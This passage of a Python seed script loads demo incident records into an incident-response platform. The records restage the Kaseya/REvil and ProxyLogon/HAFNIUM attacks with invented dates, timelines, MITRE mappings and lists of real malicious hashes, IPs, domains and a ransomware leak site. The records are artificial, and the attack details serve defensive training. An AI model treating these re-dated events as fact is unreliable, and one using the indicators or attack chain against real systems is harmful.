            {"type": "hash_sha256", "value": "3a08e3bfec2db5dbece359ac9662e65361a8625a0122e68b56cd5ef3aedf8ce1", "notes": "BlackCat ransomware binary (SHA256) | Confidence: 100% | Tags: alphv, blackcat, ransomware | Source: EDR", "malicious": True, "source": "EDR"},
            {"type": "domain", "value": "alphvmmm27o3abo3r2mlmjrpdmzle3rykajqc5xsj7j7ejksbpsa36ad.onion", "notes": "ALPHV/BlackCat leak site (.onion) | Confidence: 100% | Tags: alphv, blackcat, leak-site | Source: OSINT", "malicious": True, "source": "OSINT"},
        ],
    },

    # ── 6. Kaseya VSA — REvil Ransomware ──────────────────────────────────────
    {
        "incident": {
            "title": "Kaseya VSA — REvil Supply Chain Ransomware",
            "description": (
                "REvil exploited zero-day CVE-2021-30116 in Kaseya VSA to push ransomware through "
                "the legitimate agent update channel. 23 endpoints encrypted across 3 office "
                "locations. No data exfiltration — pure encryption. $70M ransom demand (collective).\n\n"
                "Operational impact: 23 endpoints offline 4 days. Accounting department fully "
                "offline during recovery. 18/23 endpoints restored from offline backups; 5 rebuilt."
            ),
            "severity": "high",
            "tlp": "amber",
            "incident_type": "supply_chain",
            "detection_method": "siem_alert",
            "occurred_at": "2025-07-02T14:00:00Z",
            "phase": "post_incident",
        },
        "patch": {
            "contained_at": "2025-07-02T17:00:00Z",
        },
        "close": True,
        "affected_systems": (
            "MSP Kaseya VSA Server (MSP-VSA01), Workstation (WS-ACC-001), "
            "Workstation (WS-ACC-002), Workstation (WS-ACC-003), Workstation (WS-ACC-004), "
            "Workstation (WS-ACC-005)"
        ),
        "containment_actions": (
            "Immediately disconnected all Kaseya agent endpoints from network. "
            "MSP shut down VSA server. "
            "Affected endpoints isolated."
        ),
        "eradication_actions": (
            "REvil/Sodinokibi ransomware binaries removed. "
            "Kaseya agent permanently removed from all systems. "
            "Encoded agent.crt payload and all dropped files deleted."
        ),
        "recovery_actions": (
            "18 of 23 endpoints restored from offline backups. "
            "5 endpoints rebuilt from scratch. "
            "New RMM solution evaluated and deployed to replace Kaseya."
        ),
        "lessons": {
            "incident_narrative": (
                "EXECUTIVE SUMMARY\n"
                "Our managed service provider's Kaseya VSA server was compromised via "
                "CVE-2021-30116, allowing the REvil group to push ransomware through the legitimate "
                "agent update mechanism. 23 of our endpoints were encrypted before we could isolate "
                "them. No data exfiltration confirmed — this was a pure encryption attack with a "
                "$70M ransom demand (collective)."
            ),
            "root_cause_description": (
                "ATTACK VECTOR: Zero-day exploitation of Kaseya VSA (CVE-2021-30116) — "
                "authentication bypass and arbitrary file upload. Ransomware pushed via legitimate "
                "agent update channel."
            ),
            "contributing_factors": [
                "Over-reliance on single MSP for endpoint management",
                "Kaseya agent running with SYSTEM privileges",
                "No application allowlisting",
            ],
            "root_cause_category": "supply_chain",
        },
        "timeline": [
            {
                "event_time": "2025-07-02T14:00:00Z",
                "hostname": "MSP-VSA01",
                "event_type": "Malware",
                "source": "Kaseya Logs",
                "description": "Kaseya VSA zero-day exploited (CVE-2021-30116) — malicious agent update procedure pushed to managed endpoints",
                "mitre_tactic_id": "TA0001", "mitre_tactic_name": "Initial Access",
                "mitre_technique_id": "T1195.002",
                "mitre_technique_name": "Supply Chain Compromise: Compromise Software Supply Chain",
            },
            {
                "event_time": "2025-07-02T14:15:00Z",
                "hostname": "WS-ACC-005",
                "event_type": "Process",
                "source": "EDR",
                "description": "AgentMon.exe dropped and executed agent.crt (disguised REvil payload) via certutil decode → PowerShell execution",
                "mitre_tactic_id": "TA0005", "mitre_tactic_name": "Defense Evasion",
                "mitre_technique_id": "T1140",
                "mitre_technique_name": "Deobfuscate/Decode Files or Information",
            },
            {
                "event_time": "2025-07-02T14:20:00Z",
                "hostname": "WS-ACC-005",
                "event_type": "Malware",
                "source": "AV",
                "description": "REvil/Sodinokibi ransomware executing — files encrypted with .random extension. Windows Defender disabled via PowerShell.",
                "mitre_tactic_id": "TA0040", "mitre_tactic_name": "Impact",
                "mitre_technique_id": "T1486",
                "mitre_technique_name": "Data Encrypted for Impact",
            },
            {
                "event_time": "2025-07-02T15:30:00Z",
                "hostname": "SOC",
                "event_type": "Other",
                "source": "AV Console",
                "description": "23 simultaneous Sodinokibi detections across 3 sites. MSP confirmed Kaseya VSA compromise.",
            },
        ],
        "iocs": [
            {"type": "hash_sha256", "value": "d55f983c994caa160ec63a59f6b4250fe67fb3e8c43a388aec60a4a6978e9f1e", "notes": "REvil/Sodinokibi ransomware payload (SHA256) | Confidence: 100% | Tags: revil, sodinokibi, ransomware | Source: AV", "malicious": True, "source": "AV"},
            {"type": "hash_sha1", "value": "dc6b0e8c1e9c113f0364e1c8370060dee3fcbe25", "notes": "Encoded agent.crt payload (SHA1) | Confidence: 100% | Tags: revil, kaseya | Source: Kaseya Advisory", "malicious": True, "source": "Kaseya Advisory"},
            {"type": "ip", "value": "176.123.2.216", "notes": "REvil infrastructure (shared with DarkSide) | Confidence: 80% | Tags: revil, c2 | Source: CISA", "malicious": True, "source": "CISA"},
            {"type": "domain", "value": "decoder.re", "notes": "REvil decryptor/payment portal | Confidence: 95% | Tags: revil, payment | Source: OSINT", "malicious": True, "source": "OSINT"},
        ],
    },

    # ── 7. Microsoft Exchange ProxyLogon — Hafnium ────────────────────────────
    {
        "incident": {
            "title": "Microsoft Exchange ProxyLogon — Hafnium Campaign",
            "description": (
                "Chinese state-sponsored group HAFNIUM exploited ProxyLogon vulnerability chain "
                "(CVE-2021-26855 SSRF + CVE-2021-27065 file write) on Exchange Server 2019. "
                "China Chopper webshell deployed; GAL and executive mailboxes exfiltrated over 2 weeks.\n\n"
                "Data exposure: Global Address List (all employee contact data). "
                "Executive mailboxes (CEO, CFO, General Counsel) accessed. "
                "Attribution to HAFNIUM with high confidence based on TTPs and infrastructure overlap."
            ),
            "severity": "high",
            "tlp": "amber",
            "incident_type": "vulnerability_exploitation",
            "detection_method": "external_notification",
            "occurred_at": "2025-01-06T04:00:00Z",
            "phase": "post_incident",
        },
        "patch": {
            "contained_at": "2025-01-20T18:00:00Z",
        },
        "close": True,
        "affected_systems": (
            "Exchange Server 2019 (EXCH01), Active Directory (DC01)"
        ),
        "containment_actions": (
            "Exchange server isolated. "
            "All webshells removed. "
            "OWA disabled externally. "
            "Emergency Exchange patches applied. "
            "All AD passwords reset."
        ),
        "eradication_actions": (
            "Exchange server rebuilt from scratch on latest CU. "
            "Webshell persistence removed. "
            "IIS logs preserved for forensics."
        ),
        "recovery_actions": (
            "Exchange migrated to Exchange Online (Microsoft 365) to eliminate on-prem attack surface. "
            "Hybrid config decommissioned."
        ),
        "lessons": {
            "incident_narrative": (
                "EXECUTIVE SUMMARY\n"
                "Our on-premises Exchange Server 2019 was compromised via the ProxyLogon "
                "vulnerability chain (CVE-2021-26855 SSRF + CVE-2021-27065 file write). The "
                "attacker deployed China Chopper webshell and exfiltrated the Global Address List "
                "and selected mailbox contents over a 2-week period before detection. Attribution "
                "to HAFNIUM with high confidence based on TTPs and infrastructure overlap.\n\n"
                "TECHNICAL SUMMARY\n"
                "SSRF in Exchange OWA (/owa/auth/x.js) was used to access the backend ECP API as "
                "SYSTEM, then CVE-2021-27065 arbitrary file write dropped China Chopper to "
                "C:\\inetpub\\wwwroot\\aspnet_client\\. Webshell used to run Exchange PowerShell "
                "commands, exfiltrate GAL, and stage executive mailboxes as PST files."
            ),
            "root_cause_description": (
                "ATTACK VECTOR: SSRF in Exchange OWA (CVE-2021-26855) chained with arbitrary file "
                "write (CVE-2021-27065) to drop webshell."
            ),
            "contributing_factors": [
                "Exchange Server directly exposed to internet without WAF",
                "Delayed patching — patch available 2 days before exploitation",
                "No EDR on Exchange server",
            ],
            "root_cause_category": "web_attack",
        },
        "timeline": [
            {
                "event_time": "2025-01-06T04:00:00Z",
                "hostname": "EXCH01",
                "event_type": "Network",
                "source": "IIS Logs",
                "description": "SSRF exploitation of /owa/auth/x.js — CVE-2021-26855 used to access backend ECP API as SYSTEM",
                "mitre_tactic_id": "TA0001", "mitre_tactic_name": "Initial Access",
                "mitre_technique_id": "T1190",
                "mitre_technique_name": "Exploit Public-Facing Application",
            },
            {
                "event_time": "2025-01-06T04:05:00Z",
                "hostname": "EXCH01",
                "event_type": "File System",
                "source": "Forensics",
                "description": "China Chopper webshell written to C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\error.aspx via CVE-2021-27065",
                "mitre_tactic_id": "TA0003", "mitre_tactic_name": "Persistence",
                "mitre_technique_id": "T1505.003",
                "mitre_technique_name": "Server Software Component: Web Shell",
            },
            {
                "event_time": "2025-01-08T02:00:00Z",
                "hostname": "EXCH01",
                "event_type": "Exfiltration",
                "source": "Exchange Audit",
                "description": "Global Address List exported via Exchange PowerShell using webshell — all employee contact data exfiltrated",
                "mitre_tactic_id": "TA0009", "mitre_tactic_name": "Collection",
                "mitre_technique_id": "T1114.002",
                "mitre_technique_name": "Email Collection: Remote Email Collection",
            },
            {
                "event_time": "2025-01-12T08:00:00Z",
                "hostname": "EXCH01",
                "event_type": "Exfiltration",
                "source": "Exchange Audit",
                "description": "Executive mailboxes (CEO, CFO, GC) exported as PST files and staged for download",
                "mitre_tactic_id": "TA0010", "mitre_tactic_name": "Exfiltration",
                "mitre_technique_id": "T1560.001",
                "mitre_technique_name": "Archive Collected Data: Archive via Utility",
            },
            {
                "event_time": "2025-01-20T14:00:00Z",
                "hostname": "SOC",
                "event_type": "Other",
                "source": "Microsoft MSTIC",
                "description": "Microsoft EOMT scanning tool detected webshell in OWA directory. HAFNIUM indicators confirmed.",
            },
        ],
        "iocs": [
            {"type": "ip", "value": "165.232.154.116", "notes": "HAFNIUM exploitation source IP | Confidence: 95% | Tags: hafnium, proxylogon | Source: Microsoft", "malicious": True, "source": "Microsoft"},
            {"type": "ip", "value": "157.230.221.198", "notes": "HAFNIUM C2 infrastructure | Confidence: 90% | Tags: hafnium, c2 | Source: Volexity", "malicious": True, "source": "Volexity"},
            {"type": "hash_sha256", "value": "b75f163ca9b9240bf4b37ad92bc7556b40a17e27c2b8ed5c8991385fe07d17d0", "notes": "China Chopper webshell variant (SHA256) | Confidence: 100% | Tags: hafnium, china-chopper, webshell | Source: MSTIC", "malicious": True, "source": "MSTIC"},
            {"type": "domain", "value": "p.estonine.com", "notes": "HAFNIUM C2 domain | Confidence: 85% | Tags: hafnium, c2 | Source: Volexity", "malicious": True, "source": "Volexity"},
            {"type": "ip", "value": "5.252.190.0", "notes": "Shared VPS used by multiple APT groups (also seen in MOVEit/Cl0p) | Confidence: 70% | Tags: shared-infra | Source: Threat Intel", "malicious": True, "source": "Threat Intel"},
        ],
    },
]


# ── Seeding logic ─────────────────────────────────────────────────────────────

def seed_incident(session, base, n, total, inc):
    print(f"[{n}/{total}] {inc['incident']['title']}")

    # Create core incident
    result = api(session, "post", base, "/api/incidents", inc["incident"])
    if not result:
        print("  ✗ Failed to create — skipping\n")
        return
    inc_id = result["id"]
    print(f"  ✓ Created ({inc_id[:8]}…)")

    # Patch contained_at if present
    if inc.get("patch"):
        api(session, "patch", base, f"/api/incidents/{inc_id}", inc["patch"])
        print("  ✓ Patched contained_at")

    # Close if applicable
    if inc.get("close"):
        api(session, "post", base, f"/api/incidents/{inc_id}/close")
        print("  ✓ Closed")

    # Affected systems
    systems = parse_systems(inc.get("affected_systems", ""))
    for sys in systems:
        api(session, "post", base, f"/api/incidents/{inc_id}/affected-systems", sys)
    if systems:
        print(f"  ✓ {len(systems)} affected systems")

    # Respond actions
    actions = []
    actions += split_actions("containment",  inc.get("containment_actions",  ""))
    actions += split_actions("eradication",  inc.get("eradication_actions",  ""))
    actions += split_actions("recovery",     inc.get("recovery_actions",     ""))
    for action in actions:
        api(session, "post", base, f"/api/incidents/{inc_id}/respond/actions", action)
    if actions:
        print(f"  ✓ {len(actions)} respond actions")

    # Timeline (batch)
    events = inc.get("timeline", [])
    if events:
        result = api(session, "post", base,
                     f"/api/incidents/{inc_id}/timeline/batch", {"events": events})
        created = result.get("created", 0) if result else 0
        print(f"  ✓ {created}/{len(events)} timeline events")

    # IOCs
    for ioc in inc.get("iocs", []):
        api(session, "post", base, f"/api/incidents/{inc_id}/iocs", ioc)
    if inc.get("iocs"):
        print(f"  ✓ {len(inc['iocs'])} IOCs")

    # Post-incident lessons
    lessons = inc.get("lessons")
    if lessons:
        api(session, "patch", base, f"/api/incidents/{inc_id}/post-incident/lessons", lessons)
        print("  ✓ Lessons learned")

    print()


def main():
    parser = argparse.ArgumentParser(description="Seed DFIR-FENRIR v2 with demo incidents")
    parser.add_argument("--url",      default="http://localhost:8000", help="Base URL")
    parser.add_argument("--user",     default="admin",                 help="Username")
    parser.add_argument("--password", required=True,                   help="Password")
    parser.add_argument("--insecure", action="store_true",             help="Skip TLS certificate verification")
    args = parser.parse_args()

    if args.insecure:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    session = requests.Session()
    session.verify = not args.insecure

    print(f"Logging in as '{args.user}' at {args.url}…")
    login(session, args.url, args.user, args.password)
    print("  ✓ Authenticated\n")

    total = len(INCIDENTS)
    for i, inc in enumerate(INCIDENTS, 1):
        seed_incident(session, args.url, i, total, inc)

    print("═" * 60)
    print("Cross-incident IOC overlaps to verify in Correlations view:")
    print("  185.220.101.34 — Colonial Pipeline (DarkSide) + MOVEit (Cl0p)")
    print("  176.123.2.216  — Colonial Pipeline (DarkSide) + Kaseya (REvil)")
    print("  5.252.190.0    — MOVEit (Cl0p) + ProxyLogon (Hafnium)")
    print("  T1486          — Data Encrypted for Impact × 3 ransomware incidents")
    print("  T1190          — Exploit Public-Facing App × 3 incidents")
    print("  T1195.002      — Supply Chain Compromise × SolarWinds + Kaseya")
    print("═" * 60)


if __name__ == "__main__":
    main()
